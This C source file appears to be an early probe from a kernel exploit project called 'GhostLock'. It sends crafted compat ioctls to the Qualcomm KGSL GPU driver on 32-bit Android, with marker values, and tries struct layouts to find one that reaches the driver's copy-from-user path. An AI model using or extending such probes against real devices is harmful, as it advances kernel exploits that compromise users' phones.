/**
 * kgsl_probe.c — 32-bit ARM compat KGSL ioctl probe for GhostLock
 *
 * Phase 1: Verify /dev/kgsl-3d0 ioctl dispatch reaches CFU path.
 * Phase 2: Find correct struct layout to pass initial validation.
 *
 * Build: docker run --rm -v "$(pwd):/src" --entrypoint \
 *   /opt/android-ndk-r29/.../armv7a-linux-androideabi33-clang \
 *   ghostlock-build -static -O2 /src/kgsl_probe.c -o /src/kgsl_probe
 */

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>

#define KGSL_IOCTL(nr, sz) \
    ((((uint32_t)3) << 30) | (((uint32_t)(sz)) << 16) | \
     (((uint32_t)0x09) << 8) | ((uint32_t)(nr)))

#define IOCTL_KGSL_RB_ISSUEIBCMDS   KGSL_IOCTL(0x10, 0x20)
#define IOCTL_KGSL_SUBMIT_COMMANDS  KGSL_IOCTL(0x3d, 0x60)

/* Simple ibdesc for test */
struct kgsl_ibdesc {
    uint64_t gpuaddr;
    uint64_t sizedwords;
};

int main(void) {
    printf("\n=== KGSL Compat IOCTL Probe v2 ===\n\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) {
        printf("[-] open /dev/kgsl-3d0: FAILED (errno=%d)\n", errno);
        return 1;
    }
    printf("[+] /dev/kgsl-3d0 opened (fd=%d)\n\n", fd);

    /* Allocate an ibdesc on the heap (valid userspace pointer) */
    struct kgsl_ibdesc *ibdesc = malloc(sizeof(*ibdesc));
    if (!ibdesc) { printf("[-] malloc failed\n"); goto out; }
    ibdesc->gpuaddr    = 0x4141414141414141ULL;
    ibdesc->sizedwords = 0x4242424242424242ULL;
    uint32_t ibdesc_ptr = (uint32_t)(uintptr_t)ibdesc;

    printf("[*] ibdesc @ 0x%08x: gpuaddr=0x%llx sizedwords=0x%llx\n\n",
           ibdesc_ptr,
           (unsigned long long)ibdesc->gpuaddr,
           (unsigned long long)ibdesc->sizedwords);

    /* Try RB_ISSUEIBCMDS with different struct layouts */
    printf("--- RB_ISSUEIBCMDS (cmd=0x10) struct layout probe ---\n");

    /* Layout guesses for 32-byte compat structure:
     * Try count at offsets 4, 8, 12, 16 */
    int count_offsets[] = {4, 8, 12, 16, 0xc, 0x10, 0x14};
    for (size_t li = 0; li < sizeof(count_offsets)/sizeof(count_offsets[0]); li++) {
        char cmd_buf[64] __attribute__((aligned(8)));
        memset(cmd_buf, 0, sizeof(cmd_buf));

        /* Set drawctxt_id = 1 (must be > 0 for context lookup) */
        *(uint32_t *)(cmd_buf + 0) = 1;

        /* Set count = 1 */
        *(uint32_t *)(cmd_buf + count_offsets[li]) = 1;

        /* Set ibdesc pointer at some offset before count */
        if (count_offsets[li] >= 8) {
            *(uint32_t *)(cmd_buf + count_offsets[li] - 4) = ibdesc_ptr;
        }

        int ret = ioctl(fd, IOCTL_KGSL_RB_ISSUEIBCMDS, cmd_buf);
        int e = errno;

        const char *label;
        if (ret == 0) label = "OK!";
        else if (e == 22) label = "EINVAL";
        else if (e == 14) label = "EFAULT";
        else if (e == 25) label = "ENOTTY";
        else if (e == 13) label = "EACCES";
        else label = "";

        printf("  count@+%2d: ret=%d errno=%d %s\n",
               count_offsets[li], ret, e, label);

        if (ret == 0 || e == 14 || e == 13) {
            printf("    ** Interesting! errno changed from EINVAL **\n");
        }
    }

    /* Also try SUBMIT_COMMANDS */
    printf("\n--- SUBMIT_COMMANDS (cmd=0x3d) probe ---\n");
    for (size_t li = 0; li < sizeof(count_offsets)/sizeof(count_offsets[0]); li++) {
        char cmd_buf[128] __attribute__((aligned(8)));
        memset(cmd_buf, 0, sizeof(cmd_buf));

        *(uint32_t *)(cmd_buf + 0) = 1; /* context id */
        *(uint32_t *)(cmd_buf + count_offsets[li]) = 1; /* count */

        int ret = ioctl(fd, IOCTL_KGSL_SUBMIT_COMMANDS, cmd_buf);
        int e = errno;
        const char *label = (ret == 0) ? "OK!" : (e == 22) ? "EINVAL" : (e == 14) ? "EFAULT" : "";
        printf("  count@+%2d: ret=%d errno=%d %s\n", count_offsets[li], ret, e, label);
    }

    free(ibdesc);
out:
    close(fd);
    printf("\n=== Done ===\n");
    return 0;
}
